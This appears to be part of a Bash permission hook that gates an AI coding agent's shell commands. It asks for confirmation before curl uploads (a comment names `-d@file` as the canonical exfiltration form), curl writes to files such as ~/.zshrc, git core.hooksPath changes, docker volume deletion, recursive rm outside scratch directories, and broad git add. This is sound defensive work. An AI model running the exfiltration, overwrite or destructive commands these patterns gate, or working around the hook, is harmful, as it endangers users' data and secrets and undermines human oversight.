# `ansible-playbook x --check && ansible-playbook x` is the idiom and only the
# second half needs confirming.
mentions ansible-playbook && seg_without 'ansible-playbook\b' '(^|[[:space:]])(--check|-C)([[:space:]]|$)' \
                                              && ask "ansible-playbook without --check — confirm?"

# NOTE: `-d@file` and `--data-binary@file` take no space or `=`, and they are
# the canonical exfiltration form, so `@` closes the alternation too.
mentions curl && seg_with 'curl\b' '(-X[[:space:]]*(POST|PUT|DELETE|PATCH)|--request[[:space:]]+(POST|PUT|DELETE|PATCH)|--json\b|(^|[[:space:]])(-d|--data(-raw|-binary|-urlencode)?|-F|--form|-T|--upload-file)([[:space:]]|=|@))' \
                                              && ask "curl with a mutating method or body — confirm?"

if [[ $cmd == *hooksPath* ]]; then
# NOTE: git config writes are routine (user.name in fresh clones);
# core.hooksPath is the one key that runs arbitrary code, so it is gated alone.
seg_with "${GITPFX}config\b" 'hooksPath' \
                                              && ask "git config core.hooksPath runs arbitrary code — confirm?"

# NOTE: `git -c core.hooksPath=X <anything>` is the same substitution, and
# GITPFX swallows `-c k=v` as a harmless global flag, so it needs its own rule.
seg_with 'git\b' '(^|[[:space:]])-c[[:space:]]*[^[:space:]]*hooksPath' \
                                              && ask "git -c core.hooksPath runs arbitrary code on the next git operation — confirm?"
fi

if mentions docker; then
# NOTE: `docker compose:*` is in allow, and `down -v` destroys named volumes —
# not the reversible local operation the rest of the compose lifecycle is.
seg_with 'docker([[:space:]]+|-)compose[[:space:]]+down\b' '(^|[[:space:]])(-v|--volumes)([[:space:]]|$)' \
                                              && ask "docker compose down -v destroys named volumes — confirm?"

seg_head 'docker[[:space:]]+volume[[:space:]]+rm\b' \
                                              && ask "docker volume rm destroys the volume's data — confirm?"
fi

# Recursive rm. The blanket `Bash(rm:*)` ask was dropped — deleting a scratch
# file is routine, `-r` is where it stops being. The deny above only fires on
# exactly / ~ or $HOME, so `rm -Rf ~/Documents` had nothing on it.
# NOTE: scratch roots are exempt PER TARGET, not per command, and a target
# hidden in a variable cannot be resolved here, so it stays gated.
rm_has_unsafe_target() {
  segs \
    | grep -E '^[[:space:]]*rm\b' \
    | grep -E -- '(^|[[:space:]])-[a-zA-Z]*[rR]' \
    | grep -Eo -- '(^|[[:space:]])[^-[:space:]][^[:space:]]*' \
    | sed -E "s/^[[:space:]]+//; s/^[\"']//" \
    | grep -vxE 'rm' \
    | grep -vE '^/(private/)?tmp/|CLAUDE_JOB_DIR|/scratchpad(/|$)|(^|/)_site(/|$)|(^|/)node_modules(/|$)|(^|/)\.turbo(/|$)' >/dev/null
}
mentions rm && seg_with 'rm\b' '(^|[[:space:]])-[a-zA-Z]*[rR][a-zA-Z]*([[:space:]]|$)' \
  && rm_has_unsafe_target                     && ask "recursive rm outside scratch — confirm the target?"

# curl writing to disk: `curl -o ~/.zshrc URL` is a remote-controlled overwrite
# of a startup file. `-o /dev/null` is the status-probe idiom and stays silent.
# NOTE: the exemption is decided PER TARGET. Asking "does this command mention
# /dev/null anywhere" let one probe cover a real write, and curl accepts
# repeated `-o FILE URL` pairs, so that is reachable within a single command.
# NOTE: `-[a-zA-Z]*o` catches the bundled short form, and the value may be
# attached with no separator at all (`curl -o/Users/x/.zshrc URL` really does
# write that file).
curl_writes_a_file() {
  segs \
    | grep -E '^[[:space:]]*curl\b' \
    | grep -Eo -- '(^|[[:space:]])(-[a-zA-Z]*o|--output)([[:space:]]|=)*[^[:space:]]*' \
    | sed -E 's/^[[:space:]]*(-[a-zA-Z]*o|--output)[[:space:]=]*//; s/^["'"'"']//' \
    | grep -vE '^(/dev/null)?$|^/(private/)?tmp/|CLAUDE_JOB_DIR|/scratchpad(/|$)' >/dev/null
}
if mentions curl; then
seg_with 'curl\b' '(^|[[:space:]])(-[a-zA-Z]*O|--remote-name)([[:space:]]|$)' \
                                              && ask "curl -O writes a file named by the server — confirm?"
curl_writes_a_file                            && ask "curl writing the response to a file — confirm the path?"
fi

# ---- ASK: broad git-add sweeps everything, incl. the private submodule ----
mentions git && seg_with "${GITPFX}add\b" '(^|[[:space:]])(-A|--all|\.)([[:space:]]|$)' \
                                              && ask "git add -A/./--all stages everything — prefer explicit paths?"

exit 0
